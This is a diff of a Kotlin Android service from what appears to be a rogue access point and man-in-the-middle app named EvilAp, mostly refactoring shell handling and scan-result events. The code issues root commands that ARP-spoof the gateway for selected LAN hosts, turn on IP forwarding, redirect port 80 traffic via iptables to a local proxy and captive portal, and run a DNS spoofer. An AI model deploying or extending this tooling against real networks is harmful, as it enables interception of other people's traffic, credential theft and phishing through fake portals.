@@ -10,7 +10,6 @@ import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import android.widget.Toast
-import com.nibiru.evilap.proxy.SharedClass
 import eu.chainfire.libsuperuser.Shell
 import io.reactivex.disposables.Disposable
 import java.io.Serializable
@@ -35,7 +34,7 @@ class EvilApService: Service() {
     }
     private var mDispService: Disposable? = null
     private var mCheckedHosts: MutableList<Host> = ArrayList()
-    private var mScannedHosts: MutableList<Host> = ArrayList()
+    //private var mScannedHosts: MutableList<Host> = ArrayList()
     private var mShells: MutableList<Shell.Interactive> = ArrayList()
     private lateinit var myIp: String
     private lateinit var gateway: String
@@ -57,9 +56,6 @@ class EvilApService: Service() {
             service.ACTION_STOP_SERVICE.action -> exit()
         }
         setupEventBus()
-        val manager = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
-        myIp = int2ip(manager.dhcpInfo.ipAddress)
-        gateway = int2ip(manager.dhcpInfo.gateway)
         // If this service really do get killed, there is no point restarting it automatically
         return Service.START_NOT_STICKY
     }
@@ -71,12 +67,21 @@ class EvilApService: Service() {
             when (it) {
                 service.ACTION_STOP_SERVICE -> exit()
                 is EventActiveScan -> {
-                    nativeActiveScan("wlan0")
-                } //TODO: check wifi connectivity
+                    if (EvilApApp.instance.wifiConnected){
+                        val wifiMan = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
+                        myIp = int2ip(wifiMan.dhcpInfo.ipAddress)
+                        gateway = int2ip(wifiMan.dhcpInfo.gateway)
+                        nativeActiveScan("wlan0")
+                    }
+                    else {
+                        Log.e(TAG, "no LAN to scan...")
+                        RxEventBus.INSTANCE.send2FrontEnd(EventScannedHosts(null, true))
+                    }
+                }
                 is EventArpSpoof -> { nativeArpSpoof(it.state) }
                 is EventHttpProxy -> { nativeHttpProxy(it.state) }
                 is EventHostChecked -> {
-                    if(it.h.present)
+                    if(it.checked)
                         mCheckedHosts.add(it.h)
                     else
                         mCheckedHosts.removeAt(mCheckedHosts.indexOfFirst { el: Host -> it.h.mac == el.mac })
@@ -85,7 +90,6 @@ class EvilApService: Service() {
             }
         })
     }
-
 
     private fun buildNotification(): Notification {
         val notifyIntent = Intent(this, MainActivity::class.java)
@@ -134,7 +138,8 @@ class EvilApService: Service() {
         if (mDispService!=null && !mDispService!!.isDisposed) mDispService!!.dispose()
         // notify other components
         RxEventBus.INSTANCE.send2BackEnd(EventExit())
-        getIdleShell().addCommand(listOf("pkill -f ${applicationInfo.dataDir}/lib/"))
+        val sh = getIdleShell() ?: return
+        sh.addCommand(listOf("pkill -f ${applicationInfo.dataDir}/lib/"))
         nativeArpSpoof(false)
         nativeCaptivePortal(false)
         for (shell in mShells)
@@ -142,59 +147,75 @@ class EvilApService: Service() {
         stopSelf()
     }
 
-    private fun openRootShell(): Shell.Interactive {
+    private fun openRootShell(): Shell.Interactive? {
         // start the shell in the background and keep it alive as long as the app is running
         val shell = Shell.Builder().useSU().setWantSTDERR(true)
                 .setWatchdogTimeout(0).setMinimalLogging(true).open { commandCode, exitCode, output ->
                     // Callback to report whether the shell was successfully started up
                     if (exitCode != Shell.OnCommandResultListener.SHELL_RUNNING) {
-                        Toast.makeText(applicationContext, "Error opening root shell (-_-)", Toast.LENGTH_LONG)
+                        Toast.makeText(applicationContext, "Error opening root shell (-_-)",
+                                Toast.LENGTH_LONG).show()
+                        RxEventBus.INSTANCE.send2FrontEnd(EventScannedHosts(null, true))
                         Log.e(TAG,"Error opening root shell: exitCode=$exitCode")
                     }
                     else {
                         Log.d(TAG,"Root shell opened")
                     }
                 }
+        //TODO: waitForIdle is blocking... fix with async ?
+        if (!shell.waitForIdle() || !shell.isRunning) return null
         mShells.add(shell)
         updateNotification()
         return shell
     }
 
-    private fun getIdleShell(): Shell.Interactive {
+    private fun getIdleShell(): Shell.Interactive? {
         for(shell in mShells){
-            if(shell.isIdle) return shell
             if(!shell.isRunning) {
                 mShells.remove(shell)
                 updateNotification()
             }
+            if(shell.isIdle) return shell
         }
         return openRootShell()
     }
 
     private fun nativeActiveScan(iface: String) {
         val path = applicationInfo.dataDir
-        getIdleShell().addCommand("ps | grep $path$SCAN", 0)
+        val sh = getIdleShell() ?: return
+        sh.addCommand("ps | grep $path$SCAN", 0)
         { commandCode, exitCode, output ->
             if(exitCode==0) {
                 Log.e(TAG, "Scanner already running!")
                 return@addCommand
             }
-            mScannedHosts.clear()
-
-            val cmd = "LD_LIBRARY_PATH=$path/lib/ $path$SCAN wlan0 active-arp"
-            getIdleShell().addCommand(cmd, 0, object : Shell.OnCommandLineListener {
+            val cmd = "LD_LIBRARY_PATH=$path/lib/ $path$SCAN $iface active-arp"
+            val shInner = getIdleShell() ?: return@addCommand
+            shInner.addCommand(cmd, 0, object : Shell.OnCommandLineListener {
                 override fun onCommandResult(commandCode: Int, exitCode: Int) {
                     Log.i("[native]SCANNER", "$cmd \n(exit code: $exitCode)")
-                    RxEventBus.INSTANCE.send2FrontEnd(EventScannedHosts(mScannedHosts))
+                    RxEventBus.INSTANCE.send2FrontEnd(EventScannedHosts(null, true))
                 }
                 override fun onLine(line: String) {
                     Log.d("[native]SCANNER", line)
                     if(!line.contains("=>")) return
                     val elements = line.split("=>")
                     when(elements[0]){
-                        myIp -> mScannedHosts.add(Host(elements[0],elements[1],"this", true))
-                        gateway -> mScannedHosts.add(Host(elements[0],elements[1],"gateway", true))
-                        else -> mScannedHosts.add(Host(elements[0],elements[1],"host", true))
+                        myIp -> RxEventBus.INSTANCE.send2FrontEnd(
+                                    EventScannedHosts(
+                                            Host(elements[0],elements[1], "this"), false
+                                    )
+                                )
+                        gateway -> RxEventBus.INSTANCE.send2FrontEnd(
+                                    EventScannedHosts(
+                                            Host(elements[0],elements[1], "gateway"), false
+                                    )
+                                )
+                        else -> RxEventBus.INSTANCE.send2FrontEnd(
+                                    EventScannedHosts(
+                                        Host(elements[0],elements[1], "host"), false
+                                    )
+                                )
                     }
                 }
             })
@@ -220,10 +241,11 @@ class EvilApService: Service() {
                     "sysctl -w net.ipv4.ip_forward=1",
                     "sysctl -w net.ipv6.conf.all.forwarding=1",
                     "sysctl -w net.ipv4.conf.all.send_redirects=0")
-            getIdleShell().addCommand(cmds)
+            val sh = getIdleShell() ?: return
+            sh.addCommand(cmds)
             for(host in mCheckedHosts) {
                 val cmd = "LD_LIBRARY_PATH=$path/lib/ $path$ARPSPOOF $gateway ${host.ip}"
-                getIdleShell().addCommand(cmd, 0, object : Shell.OnCommandLineListener {
+                sh.addCommand(cmd, 0, object : Shell.OnCommandLineListener {
                     override fun onCommandResult(commandCode: Int, exitCode: Int) {
                         Log.i("[native]ARPSPOOF", "$cmd \n(exit code: $exitCode)")
                     }
@@ -241,7 +263,8 @@ class EvilApService: Service() {
                     "sysctl -w net.ipv4.ip_forward=0",
                     "sysctl -w net.ipv6.conf.all.forwarding=0",
                     "sysctl -w net.ipv4.conf.all.send_redirects=1")
-            getIdleShell().addCommand(cmds)
+            val sh = getIdleShell() ?: return
+            sh.addCommand(cmds)
         }
     }
 
@@ -255,21 +278,26 @@ class EvilApService: Service() {
             cmds = listOf(
                     "iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
                     "ip6tables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
-        getIdleShell().addCommand(cmds)
+        val sh = getIdleShell() ?: return
+        sh.addCommand(cmds)
     }
 
     private fun nativeCaptivePortal(state: Boolean) {
+        // if myIp is not initialized then no scanning was done, so no iptables cleanup needed
+        if (!::myIp.isInitialized) return
         if(state) {
             val path = applicationInfo.dataDir
             val cmds = listOf(
                     "iptables -t nat -I PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080",
                     "LD_LIBRARY_PATH=$path/lib/ $path$DNSSPOOF wlan0")
-            getIdleShell().addCommand(cmds)
+            val sh = getIdleShell() ?: return
+            sh.addCommand(cmds)
         }
         else {
             val cmds = listOf(
                     "iptables -t nat -D PREROUTING -p tcp -d $myIp --dport 80 -j REDIRECT --to-port 8080")
-            getIdleShell().addCommand(cmds)
+            val sh = getIdleShell() ?: return
+            sh.addCommand(cmds)
         }
     }
 
@@ -281,14 +309,14 @@ class EvilApService: Service() {
     }
 
     /************************************* COMMUNICATION ******************************************/
-    data class Host(val ip: String, val mac: String, var type: String, var present: Boolean): Serializable
+    data class Host(val ip: String, val mac: String, var type: String): Serializable
     // Back end events
     class EventExit
     data class EventActiveScan(val type: String)
     data class EventArpSpoof(val state: Boolean)
     data class EventHttpProxy(val state: Boolean)
     data class EventCaptivePortal(val state: Boolean)
-    data class EventHostChecked(val h: Host)
+    data class EventHostChecked(val h: Host, val checked: Boolean)
     // Front end events
-    data class EventScannedHosts(val hosts: List<Host>)
+    data class EventScannedHosts(val host: Host?, val finnish: Boolean)
 }
